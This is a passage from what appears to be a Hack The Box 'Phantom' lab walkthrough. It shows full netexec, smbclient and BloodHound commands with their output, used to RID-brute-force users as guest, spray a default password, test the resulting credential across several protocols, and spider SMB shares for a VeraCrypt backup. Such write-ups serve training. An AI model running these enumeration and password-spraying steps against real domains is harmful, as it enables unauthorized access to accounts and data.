UiAgMTAgMCBSICAxMSAwIFIgIDEyIDAgUiAgMTMgMCBSICAxNCAwIFIgIF0KPj4KZW5kb2JqCgoy\
MyAwIG9iago8PC9UeXBlL1N0cnVjdFRyZWVSb290Ci9QYXJlbnRUcmVlIDI0IDAgUgovUm9sZU1h\
cDw8L1N0YW5kYXJkL1AKPj4KL0tbNCAwIFIgIF0KPj4KZW5kb2JqCgoyNCAwIG9iago8PC9OdW1z\
WwowIFsgNSAwIFIgNiAwIFIgNyAwIFIgOCAwIFIgOSAwIFIgMTAgMCBSIDExIDAgUiAxMSAwIFIg\
MTIgMCBSIDEyIDAgUgoxMyAwIFIgMTQgMCBSIF0KXT4+CmVuZG9iagoKMTUgMCBvYmoKPDwvVHlw\
ZS9QYWdlcwovUmVzb3VyY2VzIDIyIDAgUgovS2lkc1sgMSAwIFIgXQovQ291bnQgMT4+CmVuZG9i\
agoKMjUgMCBvYmoKPDwvVHlwZS9DYXRhbG9nL1BhZ2VzIDE1IDAgUgovUGFnZU1vZGUvVXNlT3V0\
bGluZXMKL09wZW5BY3Rpb25bMSAwIFIgL1hZWiBudWxsIG51bGwgMF0KL1N0cnVjdFRyZWVSb290\
IDIzIDAgUgovTGFuZyhlbi1VUykKL01hcmtJbmZvPDwvTWFya2VkIHRydWU+Pgo+PgplbmRvYmoK\
CjI2IDAgb2JqCjw8L0NyZWF0b3I8RkVGRjAwNTcwMDcyMDA2OTAwNzQwMDY1MDA3Mj4KL1Byb2R1\
Y2VyPEZFRkYwMDRDMDA2OTAwNjIwMDcyMDA2NTAwNEYwMDY2MDA2NjAwNjkwMDYzMDA2NTAwMjAw\
MDMyMDAzNDAwMkUwMDMyPgovQ3JlYXRpb25EYXRlKEQ6MjAyNDA3MDYxMTUzMDYrMDInMDAnKT4+\
CmVuZG9iagoKeHJlZgowIDI3CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwNzQwMCAwMDAwMCBu\
IAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDA3MDcgMDAwMDAgbiAKMDAwMDAwODYyNyAwMDAw\
MCBuIAowMDAwMDA3NTE2IDAwMDAwIG4gCjAwMDAwMDc2MjYgMDAwMDAgbiAKMDAwMDAwNzczNiAw\
MDAwMCBuIAowMDAwMDA3ODQ2IDAwMDAwIG4gCjAwMDAwMDc5NTYgMDAwMDAgbiAKMDAwMDAwODA2\
NiAwMDAwMCBuIAowMDAwMDA4MTc3IDAwMDAwIG4gCjAwMDAwMDgyOTAgMDAwMDAgbiAKMDAwMDAw\
ODQwMyAwMDAwMCBuIAowMDAwMDA4NTE1IDAwMDAwIG4gCjAwMDAwMDg5OTEgMDAwMDAgbiAKMDAw\
MDAwMDcyNyAwMDAwMCBuIAowMDAwMDA2MjI2IDAwMDAwIG4gCjAwMDAwMDYyNDggMDAwMDAgbiAK\
MDAwMDAwNjQ0NyAwMDAwMCBuIAowMDAwMDA2OTU3IDAwMDAwIG4gCjAwMDAwMDczMTEgMDAwMDAg\
biAKMDAwMDAwNzM0NCAwMDAwMCBuIAowMDAwMDA4Nzc3IDAwMDAwIG4gCjAwMDAwMDg4NzYgMDAw\
MDAgbiAKMDAwMDAwOTA2NiAwMDAwMCBuIAowMDAwMDA5MjM1IDAwMDAwIG4gCnRyYWlsZXIKPDwv\
U2l6ZSAyNy9Sb290IDI1IDAgUgovSW5mbyAyNiAwIFIKL0lEIFsgPEM0QUQ2NUU5NEZCOTk3OTYx\
MTU1Q0FGRkQ2QUMyQjUzPgo8QzRBRDY1RTk0RkI5OTc5NjExNTVDQUZGRDZBQzJCNTM+IF0KL0Rv\
Y0NoZWNrc3VtIC8wQTM4N0RBQjYxNTBCMkRCMTg0MzJGMDJENzY2MDQxMwo+PgpzdGFydHhyZWYK\
OTQxNAolJUVPRgo=

\--===============6932979162079994354==--

{{< /code >}}

The attachment is base64-encoded. I’ll save it to a file and decode it:

```
┌──(root㉿kali)-[~/Desktop]
└─# vim base64
                                                                                                                    
┌──(root㉿kali)-[~/Desktop]
└─# base64 -d base64 > base64.pdf  
                                                                                                                    
┌──(root㉿kali)-[~/Desktop]
└─# file base64
base64: ASCII text
                                                                                                                    
┌──(root㉿kali)-[~/Desktop]
└─# open base64.pdf 

```

![Pasted image 20260430151048.png](/ob/Pasted%20image%2020260430151048.png)

### SMB-rid-brute

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-rid-brute" >}} The guest user doesn’t have privileges to list users on the domain,but it can brute force RID’s using a RID-cycle attack

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.63  -u 'guest' -p '' --rid-brute                                                                 
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest: 
SMB         10.129.234.63   445    DC               498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               500: PHANTOM\Administrator (SidTypeUser)
SMB         10.129.234.63   445    DC               501: PHANTOM\Guest (SidTypeUser)
SMB         10.129.234.63   445    DC               502: PHANTOM\krbtgt (SidTypeUser)
SMB         10.129.234.63   445    DC               512: PHANTOM\Domain Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               513: PHANTOM\Domain Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               514: PHANTOM\Domain Guests (SidTypeGroup)
SMB         10.129.234.63   445    DC               515: PHANTOM\Domain Computers (SidTypeGroup)
SMB         10.129.234.63   445    DC               516: PHANTOM\Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               517: PHANTOM\Cert Publishers (SidTypeAlias)
SMB         10.129.234.63   445    DC               518: PHANTOM\Schema Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               519: PHANTOM\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.63   445    DC               521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               525: PHANTOM\Protected Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               526: PHANTOM\Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.63   445    DC               571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               1000: PHANTOM\DC$ (SidTypeUser)
SMB         10.129.234.63   445    DC               1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         10.129.234.63   445    DC               1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.129.234.63   445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.129.234.63   445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.129.234.63   445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.129.234.63   445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.129.234.63   445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.129.234.63   445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.129.234.63   445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.129.234.63   445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.129.234.63   445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.129.234.63   445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.129.234.63   445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.129.234.63   445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.129.234.63   445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.129.234.63   445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.129.234.63   445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.129.234.63   445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.129.234.63   445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.129.234.63   445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.129.234.63   445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.129.234.63   445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.129.234.63   445    DC               1130: PHANTOM\alucas (SidTypeUser)
SMB         10.129.234.63   445    DC               1131: PHANTOM\ebryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1132: PHANTOM\vlynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1133: PHANTOM\ghall (SidTypeUser)
SMB         10.129.234.63   445    DC               1134: PHANTOM\ssimpson (SidTypeUser)
SMB         10.129.234.63   445    DC               1135: PHANTOM\ccooper (SidTypeUser)
SMB         10.129.234.63   445    DC               1136: PHANTOM\vcunningham (SidTypeUser)
SMB         10.129.234.63   445    DC               1137: PHANTOM\SSPR Service (SidTypeGroup)

```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat tmp.txt |  awk -F '\' '{print $2}' | awk -F "(" '{print $1}'  | sed 's/ //g' > username.txt  && cat username.txt
EnterpriseRead-onlyDomainControllers
Administrator
Guest
krbtgt
DomainAdmins
DomainUsers
DomainGuests
DomainComputers
DomainControllers
CertPublishers
SchemaAdmins
EnterpriseAdmins
GroupPolicyCreatorOwners
Read-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
KeyAdmins
EnterpriseKeyAdmins
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
DC$
DnsAdmins
DnsUpdateProxy
svc_sspr
TechSupports
ServerAdmins
ICTSecurity
DevOps
Accountants
FinManagers
EmployeeRelations
HRManagers
rnichols
pharrison
wsilva
elynch
nhamilton
lstanley
bbarnes
cjones
agarcia
ppayne
ibryant
ssteward
wstewart
vhoward
crose
twright
fhanson
cferguson
alucas
ebryant
vlynch
ghall
ssimpson
ccooper
vcunningham
SSPRService

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-BurteForce" >}} Doing the bruteforce with netexec 's --continue-on-success and  --no-bruteforce,Normally, NetExec does a "Many-to-Many" attack. If you give it a file with 10 usernames and a file with 10 passwords, it will make **100 attempts** (trying every single password against every single user).

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.63  -u ./username.txt  -p  'Ph4nt0m@5t4rt!' --continue-on-success   --no-bruteforce | grep '[+]'
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseRead-onlyDomainControllers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainUsers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainGuests:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainComputers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainControllers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\CertPublishers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\SchemaAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\GroupPolicyCreatorOwners:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\Read-onlyDomainControllers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\CloneableDomainControllers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ProtectedUsers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\KeyAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseKeyAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\RASandIASServers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\AllowedRODCPasswordReplicationGroup:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DeniedRODCPasswordReplicationGroup:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DnsAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DnsUpdateProxy:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\TechSupports:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ServerAdmins:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ICTSecurity:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DevOps:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\Accountants:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\FinManagers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EmployeeRelations:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\HRManagers:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
SMB                      10.129.234.63   445    DC               [+] phantom.vl\SSPRService:Ph4nt0m@5t4rt! (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\:Ph4nt0m@5t4rt! (Guest)

```

the ibryant:Ph4nt0m@5t4rt is valid

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-account-verify-nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.phantom.vl  -u 'ibryant' -p 'Ph4nt0m@5t4rt!'; done

[*] Testing smb...
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 

[*] Testing winrm...
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.63   5985   DC               [-] phantom.vl\ibryant:Ph4nt0m@5t4rt!

[*] Testing wmi...
RPC         10.129.234.63   135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
RPC         10.129.234.63   135    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 

[*] Testing rdp...
RDP         10.129.234.63   3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:phantom.vl) (nla:True)
RDP         10.129.234.63   3389   DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
LDAP        10.129.234.63   389    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 


```

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc ldap  10.129.234.63  -u ibryant  -p  'Ph4nt0m@5t4rt!' --bloodhound -c All --dns-server 10.129.234.63
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
LDAP        10.129.234.63   389    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
LDAP        10.129.234.63   389    DC               Resolved collection methods: session, acl, rdp, dcom, localadmin, group, container, trusts, objectprops, psremote
LDAP        10.129.234.63   389    DC               Done in 00M 24S
LDAP        10.129.234.63   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.234.63_2026-04-30_032301_bloodhound.zip
                                                                                                                                               
```

### bloodhound

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-view-all-user" >}} Using the cypher to find all users to know who is potential to attack\
{{< /toggle >}}

{{< code >}}\
MATCH (u:User)\
WHERE u.domain = "PHANTOM.VL"\
RETURN u\
{{< /code >}}

![Pasted image 20260430153224.png](/ob/Pasted%20image%2020260430153224.png)

![Pasted image 20260430153239.png](/ob/Pasted%20image%2020260430153239.png)

The IBRYANT@PHANTOM.VL dont have the outblood

so back to smb

```
┌──(root㉿kali)-[~/.nxc/logs]
└─# nxc smb 10.129.234.63  -u ibryant  -p  'Ph4nt0m@5t4rt!' --shares                                        
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ            
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.63   445    DC               Public          READ            
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share 

```

`Departments Share` suppose is not here

```
┌──(root㉿kali)-[~/.nxc/logs]
└─# smbclient //10.129.234.63/"Departments Share" -U ibryant%Ph4nt0m@5t4rt!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

                6127103 blocks of size 4096. 2382258 blocks available
smb: \> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-enumerating" >}} Using the netexec 's model of spider\_plus to enumerating all file for easily attack .

{{< /toggle >}}

```
┌──(root㉿kali)-[~/.nxc/logs]
└─# nxc smb 10.129.234.63  -u ibryant  -p  'Ph4nt0m@5t4rt!'  -M spider_plus                            

SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
SPIDER_PLUS 10.129.234.63   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.63   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.234.63   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.63   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.234.63   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.234.63   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.63   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ            
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.63   445    DC               Public          READ            
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.129.234.63   445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.234.63.json".
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, Departments Share, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Readable Shares:  5 (Departments Share, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.63   445    DC               [*] Total folders found:  23
SPIDER_PLUS 10.129.234.63   445    DC               [*] Total files found:    19
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size average:    13.56 MB
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size max:        82.48 MB
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/.nxc/logs]
└─# cd /root/.nxc/modules/nxc_spider_plus
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/.nxc/modules/nxc_spider_plus]
└─# ls
10.129.234.63.json  10.129.234.72.json
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/.nxc/modules/nxc_spider_plus]
└─# cat 10.129.234.63.json 
{
    "Departments Share": {
        "Finance/Expense_Reports.pdf": {
            "atime_epoch": "2024-07-06 12:25:11",
            "ctime_epoch": "2024-07-06 12:25:10",
            "mtime_epoch": "2024-07-11 11:02:34",
            "size": "693.08 KB"
        },
        "Finance/Invoice-Template.pdf": {
            "atime_epoch": "2024-07-06 12:23:54",
            "ctime_epoch": "2024-07-06 12:23:53",
            "mtime_epoch": "2024-07-06 12:23:54",
            "size": "185.68 KB"
        },
        "Finance/TaxForm.pdf": {
            "atime_epoch": "2024-07-06 12:22:58",
            "ctime_epoch": "2024-07-06 12:22:57",
            "mtime_epoch": "2024-07-06 12:22:58",
            "size": "156.98 KB"
        },
        "HR/Employee-Emergency-Contact-Form.pdf": {
            "atime_epoch": "2024-07-06 12:21:31",
            "ctime_epoch": "2024-07-06 12:21:30",
            "mtime_epoch": "2024-07-11 11:02:11",
            "size": "21.35 KB"
        },
        "HR/EmployeeHandbook.pdf": {
            "atime_epoch": "2024-07-06 12:16:25",
            "ctime_epoch": "2024-07-06 12:16:24",
            "mtime_epoch": "2024-07-06 12:16:25",
            "size": "289.49 KB"
        },
        "HR/Health_Safety_Information.pdf": {
            "atime_epoch": "2024-07-06 12:20:39",
            "ctime_epoch": "2024-07-06 12:20:38",
            "mtime_epoch": "2024-07-06 12:20:39",
            "size": "3.76 MB"
        },
        "HR/NDA_Template.pdf": {
            "atime_epoch": "2024-07-06 12:17:33",
            "ctime_epoch": "2024-07-06 12:17:32",
            "mtime_epoch": "2024-07-06 12:17:33",
            "size": "18.35 KB"
        },
        "IT/Backup/IT_BACKUP_201123.hc": {
            "atime_epoch": "2024-07-06 14:04:14",
            "ctime_epoch": "2024-07-06 14:04:14",
            "mtime_epoch": "2024-07-06 14:04:34",
            "size": "12 MB"
        },
        "IT/TeamViewerQS_x64.exe": {
            "atime_epoch": "2024-07-06 12:27:31",
            "ctime_epoch": "2024-07-06 12:27:31",
            "mtime_epoch": "2024-07-06 12:26:59",
            "size": "30.99 MB"
        },
        "IT/TeamViewer_Setup_x64.exe": {
            "atime_epoch": "2024-07-06 12:27:31",
            "ctime_epoch": "2024-07-06 12:27:31",
            "mtime_epoch": "2024-07-06 12:27:15",
            "size": "76.66 MB"
        },
        "IT/Wireshark-4.2.5-x64.exe": {
            "atime_epoch": "2024-07-06 12:14:08",
            "ctime_epoch": "2024-07-06 12:13:17",
            "mtime_epoch": "2024-07-06 12:25:36",
            "size": "82.48 MB"
        },
        "IT/mRemoteNG-Installer-1.76.20.24615.msi": {
            "atime_epoch": "2024-07-06 12:14:26",
            "ctime_epoch": "2024-07-06 12:14:21",
            "mtime_epoch": "2024-07-06 12:25:36",
            "size": "41.57 MB"
        },
        "IT/veracrypt-1.26.7-Ubuntu-22.04-amd64.deb": {
            "atime_epoch": "2024-07-11 10:59:06",
            "ctime_epoch": "2024-07-11 10:59:02",
            "mtime_epoch": "2024-07-11 10:59:06",
            "size": "8.77 MB"
        }
    },
    "NETLOGON": {},
    "Public": {
        "tech_support_email.eml": {
            "atime_epoch": "2024-07-06 12:08:50",
            "ctime_epoch": "2024-07-06 12:08:50",
            "mtime_epoch": "2024-07-06 12:09:28",
            "size": "14.22 KB"
        }
    },
    "SYSVOL": {
        "phantom.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2024-07-04 11:11:54",
            "ctime_epoch": "2024-07-04 09:14:55",
            "mtime_epoch": "2024-07-04 11:11:54",
            "size": "22 B"
        },
        "phantom.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2024-07-04 11:11:54",
            "ctime_epoch": "2024-07-04 09:14:55",
            "mtime_epoch": "2024-07-04 11:11:54",
            "size": "1.07 KB"
        },
        "phantom.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2024-07-04 09:18:48",
            "ctime_epoch": "2024-07-04 09:18:48",
            "mtime_epoch": "2024-07-04 09:18:48",
            "size": "2.72 KB"
        },
        "phantom.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2024-07-06 14:43:00",
            "ctime_epoch": "2024-07-04 09:14:55",
            "mtime_epoch": "2024-07-06 14:43:00",
            "size": "22 B"
        },
        "phantom.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2024-07-06 14:43:00",
            "ctime_epoch": "2024-07-04 09:14:55",
            "mtime_epoch": "2024-07-06 14:43:00",
            "size": "3.91 KB"
        }
    }
}                         
```

I’ll download all the files, but the one that ends up being interesting is `IT_BACKUP_2021123.hc`.

```
┌──(root㉿kali)-[~/.nxc/modules/nxc_spider_plus]
└─# smbclient '//dc.phantom.vl/Departments Share' -U 'ibryant%Ph4nt0m@5t4rt!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

                6127103 blocks of size 4096. 2382073 blocks available
smb: \> cd IT
smb: \IT\> dir
  .                                   D        0  Thu Jul 11 10:59:02 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Backup                              D        0  Sat Jul  6 14:04:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 12:14:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 12:26:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 12:27:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 16:30:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 12:14:08 2024

                6127103 blocks of size 4096. 2382073 blocks available
smb: \IT\> cd Backup\
smb: \IT\Backup\> ls
  .                                   D        0  Sat Jul  6 14:04:34 2024
  ..                                  D        0  Thu Jul 11 10:59:02 2024
  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024

                6127103 blocks of size 4096. 2382041 blocks available

```

seem the IT\_BACKUP\_201123.hc is the file of veracrypt

One of the installers is [VeraCrypt](https://veracrypt.io/en/Downloads.html), which is a free and open source tool for encrypting volumes of data for privacy protection. It creates encrypted volumes in `.hc` files like the one in `Backups`.

The HTB “Machine Information” section says:

{{< code >}}\
Should you need to crack a hash, use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character).\
{{< /code >}}

{{< toggle "Tag 🏷️" >}}

